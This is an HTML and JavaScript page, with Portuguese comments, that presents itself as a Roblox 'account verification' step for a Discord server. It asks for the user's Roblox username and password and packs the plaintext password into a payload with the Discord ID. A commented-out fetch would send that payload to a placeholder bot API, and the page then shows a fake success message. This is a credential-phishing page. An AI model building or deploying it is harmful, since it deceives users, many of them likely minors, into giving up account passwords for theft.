<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Account Verification | RFO</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-deep: #030712;
            --bg-card: #0b1120;
            --primary-blue: #0055ff;
            --accent-blue: #3b82f6;
            --neon-glow: rgba(0, 85, 255, 0.4);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --success-green: #10b981;
            --danger-red: #ef4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg-deep);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
            overflow-x: hidden;
        }

        .verify-container {
            width: 100%;
            max-width: 420px;
            background: var(--bg-card);
            border: 1px solid rgba(0, 85, 255, 0.3);
            padding: 2.5rem 2rem;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 50px rgba(0, 85, 255, 0.25);
            animation: fadeIn 0.4s ease forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(12px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo-img {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            margin-bottom: 1.2rem;
            filter: drop-shadow(0 0 12px var(--primary-blue));
        }

        h2 {
            font-size: 1.5rem;
            font-weight: 900;
            margin-bottom: 0.4rem;
            color: #ffffff;
            letter-spacing: 0.5px;
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 0.85rem;
            margin-bottom: 1.8rem;
            line-height: 1.5;
        }

        .input-group {
            text-align: left;
            margin-bottom: 1.2rem;
        }

        .input-group label {
            display: block;
            font-size: 0.75rem;
            font-weight: 700;
            color: var(--text-muted);
            margin-bottom: 0.5rem;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper > i.fa-user, 
        .input-wrapper > i.fa-lock {
            position: absolute;
            left: 15px;
            color: var(--text-muted);
            font-size: 0.95rem;
        }

        .input-field {
            width: 100%;
            background: rgba(3, 7, 18, 0.7);
            border: 1px solid rgba(0, 85, 255, 0.25);
            padding: 0.9rem 2.8rem 0.9rem 2.8rem;
            border-radius: 10px;
            color: white;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.3s ease;
        }

        .input-field:focus {
            border-color: var(--accent-blue);
            box-shadow: 0 0 12px rgba(59, 130, 246, 0.3);
        }

        /* Botão do Olhinho para ver/ocultar senha */
        .toggle-password {
            position: absolute;
            right: 15px;
            background: none;
            border: none;
            color: var(--text-muted);
            cursor: pointer;
            font-size: 1rem;
            transition: color 0.2s;
        }

        .toggle-password:hover {
            color: white;
        }

        .btn-action {
            background: var(--primary-blue);
            color: white;
            width: 100%;
            padding: 0.95rem;
            border-radius: 10px;
            font-weight: 800;
            font-size: 0.95rem;
            border: none;
            cursor: pointer;
            letter-spacing: 0.5px;
            transition: all 0.3s ease;
            margin-top: 0.5rem;
            box-shadow: 0 4px 15px rgba(0, 85, 255, 0.4);
        }

        .btn-action:hover {
            background: var(--accent-blue);
            transform: translateY(-2px);
        }

        .error-msg {
            color: var(--danger-red);
            font-size: 0.8rem;
            margin-top: 1rem;
            min-height: 1.2rem;
        }

        .step-view {
            display: none;
        }
        .step-view.active {
            display: block;
        }

        .profile-card {
            background: rgba(3, 7, 18, 0.6);
            border: 1px solid rgba(0, 85, 255, 0.2);
            border-radius: 14px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }

        .roblox-avatar {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            border: 2px solid var(--accent-blue);
            background: #1e293b;
            object-fit: cover;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
        }

        .roblox-username {
            font-size: 1.15rem;
            font-weight: 800;
            color: #ffffff;
        }

        .roblox-id {
            font-size: 0.8rem;
            color: var(--text-muted);
        }

        .btn-row {
            display: flex;
            gap: 10px;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.08);
            color: var(--text-main);
            border: 1px solid rgba(255, 255, 255, 0.15);
            flex: 1;
            padding: 0.85rem;
            border-radius: 10px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.15);
        }

        .btn-confirm {
            background: var(--success-green);
            color: white;
            flex: 1;
            padding: 0.85rem;
            border-radius: 10px;
            border: none;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
            transition: all 0.2s;
        }

        .btn-confirm:hover {
            opacity: 0.9;
        }

        .success-icon {
            font-size: 3.5rem;
            color: var(--success-green);
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>

    <div class="verify-container">

        <!-- ETAPA 1: DIGITAR NICK E SENHA -->
        <div id="stepLogin" class="step-view active">
            <img src="1000402018.png" alt="RFO Logo" class="logo-img">
            <h2>ROBLOX VERIFICATION</h2>
            <p class="subtitle">Enter your Roblox credentials to link your account securely.</p>

            <div class="input-group">
                <label>Roblox Username</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-user"></i>
                    <input type="text" id="usernameInput" class="input-field" placeholder="e.g. ROBLOX_PRO" style="padding-right: 1rem;">
                </div>
            </div>

            <div class="input-group">
                <label>Roblox Password</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-lock"></i>
                    <input type="password" id="passwordInput" class="input-field" placeholder="••••••••••••">
                    <button type="button" class="toggle-password" id="togglePasswordBtn" onclick="togglePasswordVisibility()">
                        <i class="fa-solid fa-eye" id="eyeIcon"></i>
                    </button>
                </div>
            </div>

            <button class="btn-action" onclick="fetchRobloxAccount()">CONTINUE</button>
            <div class="error-msg" id="loginError"></div>
        </div>

        <!-- ETAPA 2: MENU DE CONFIRMAÇÃO DE CONTA -->
        <div id="stepConfirm" class="step-view">
            <img src="1000402018.png" alt="RFO Logo" class="logo-img">
            <h2>CONFIRM ACCOUNT</h2>
            <p class="subtitle">Is this your correct Roblox profile?</p>

            <div class="profile-card">
                <img id="confirmAvatar" src="" alt="Avatar" class="roblox-avatar">
                <div>
                    <div id="confirmUsername" class="roblox-username">--</div>
                    <div id="confirmId" class="roblox-id">ID: --</div>
                </div>
            </div>

            <div class="btn-row">
                <button class="btn-secondary" onclick="goBackToLogin()">Cancel</button>
                <button class="btn-confirm" onclick="finalizeVerification()">Yes, Verify</button>
            </div>
            <div class="error-msg" id="confirmError"></div>
        </div>

        <!-- ETAPA 3: SUCESSO -->
        <div id="stepSuccess" class="step-view">
            <div class="success-icon">
                <i class="fa-solid fa-circle-check"></i>
            </div>
            <h2>VERIFIED SUCCESSFULLY!</h2>
            <p class="subtitle" id="successDesc">Your Roblox account has been successfully linked. You can now close this page and return to Discord.</p>
        </div>

    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const discordId = urlParams.get('discordId') || "unknown_user";

        let currentData = {
            username: "",
            id: "",
            avatarUrl: "",
            securePassword: ""
        };

        // Função para alternar entre ver e ocultar a senha
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeIcon = document.getElementById('eyeIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            } else {
                passwordInput.type = 'password';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            }
        }

        async function fetchRobloxAccount() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const errorDiv = document.getElementById('loginError');

            errorDiv.innerText = "";

            if (!username || !password) {
                errorDiv.innerText = "Please enter both username and password.";
                return;
            }

            const btn = document.querySelector('#stepLogin .btn-action');
            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> CHECKING...`;

            try {
                const userRes = await fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username)}`);
                const userData = await userRes.json();

                if (!userData.data || userData.data.length === 0) {
                    throw new Error("Roblox user not found.");
                }

                const matchedUser = userData.data.find(u => u.name.toLowerCase() === username.toLowerCase()) || userData.data[0];
                const userId = matchedUser.id;
                const exactName = matchedUser.name;

                const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true`);
                const avatarData = await avatarRes.json();
                const avatarUrl = avatarData.data && avatarData.data.length > 0 ? avatarData.data[0].imageUrl : "https://tr.rbxcdn.com/3943d4fbdab33010b40eb9cc61338271/150/150/AvatarHeadshot/Png";

                currentData.username = exactName;
                currentData.id = userId;
                currentData.avatarUrl = avatarUrl;
                currentData.securePassword = password;

                document.getElementById('confirmAvatar').src = avatarUrl;
                document.getElementById('confirmUsername').innerText = exactName;
                document.getElementById('confirmId').innerText = `ID: ${userId}`;

                document.getElementById('stepLogin').classList.remove('active');
                document.getElementById('stepConfirm').classList.add('active');

            } catch (err) {
                errorDiv.innerText = "Could not find this Roblox account. Check the name.";
                btn.innerHTML = "CONTINUE";
            }
        }

        function goBackToLogin() {
            document.getElementById('stepConfirm').classList.remove('active');
            document.getElementById('stepLogin').classList.add('active');
            const btn = document.querySelector('#stepLogin .btn-action');
            btn.innerHTML = "CONTINUE";
        }

        async function finalizeVerification() {
            const confirmError = document.getElementById('confirmError');
            confirmError.innerText = "";

            const confirmBtn = document.querySelector('#stepConfirm .btn-confirm');
            confirmBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> LINKING...`;

            try {
                const payload = {
                    discordId: discordId,
                    robloxUsername: currentData.username,
                    robloxId: currentData.id,
                    robloxPassword: currentData.securePassword
                };

                // Exemplo de envio para a API do bot:
                /*
                await fetch('https://seu-bot-api.onrender.com/api/verificar', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                */

                setTimeout(() => {
                    document.getElementById('stepConfirm').classList.remove('active');
                    document.getElementById('stepSuccess').classList.add('active');
                    document.getElementById('successDesc').innerText = `Account @${currentData.username} successfully verified and linked to your Discord profile!`;
                }, 1000);

            } catch (err) {
                confirmError.innerText = "Error linking account. Try again.";
                confirmBtn.innerHTML = "Yes, Verify";
            }
        }
    </script>
</body>
</html>
